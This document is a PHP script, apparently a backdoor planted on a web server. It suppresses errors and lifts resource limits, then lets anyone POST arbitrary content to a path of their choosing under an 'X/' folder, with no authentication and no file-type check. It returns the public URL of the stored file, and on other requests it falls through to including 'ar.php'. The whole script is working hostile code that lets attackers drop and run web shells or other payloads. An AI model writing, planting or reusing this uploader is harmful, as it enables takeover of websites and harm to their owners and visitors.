<?php
// Configurações de performance e silêncio
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '16000M');
@set_time_limit(0);

// 1. Definição do Host e Protocolo
$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')) ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';

// 2. Captura e limpeza do caminho
$path = '';
if (!empty($_SERVER['PATH_INFO'])) {
    $path = trim($_SERVER['PATH_INFO'], '/');
} else {
    $uri = explode('?', $_SERVER['REQUEST_URI'])[0];
    $script = $_SERVER['SCRIPT_NAME'];
    $path = trim(str_replace($script, '', $uri), '/');
}
$path = str_replace(['../', '..\\', "\0"], '', urldecode($path));

$isUpload = false; // Variável de controle

// 3. Processamento do Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($path)) {
    
    $baseDir = __DIR__ . '/X/';
    $localPath = $baseDir . $path;
    
    if (!is_dir(dirname($localPath))) {
        @mkdir(dirname($localPath), 0777, true);
    }

    $data = null;
    $input = file_get_contents('php://input');
    
    if (!empty($input)) {
        $data = $input;
    } elseif (!empty($_FILES)) {
        $f = reset($_FILES);
        if (isset($f['tmp_name']) && is_uploaded_file($f['tmp_name'])) {
            $data = file_get_contents($f['tmp_name']);
        }
    }

    // 4. Se houver dados, salva e marca como upload identificado
    if ($data !== null) {
        if (@file_put_contents($localPath, $data, LOCK_EX) !== false) {
            @chmod($localPath, 0644);
            echo $protocol . $host . '/X/' . str_replace('\\', '/', $path);
            
            $isUpload = true; // ✅ Identificamos que FOI um upload
        }
    }
}

// 5. Execução Condicional
// Só entra aqui se NÃO foi identificado um upload com sucesso
if (!$isUpload) {
    sleep(5);
    include_once "ar.php";
} else {
    // Se foi upload, encerramos o script aqui para garantir
    exit;
}
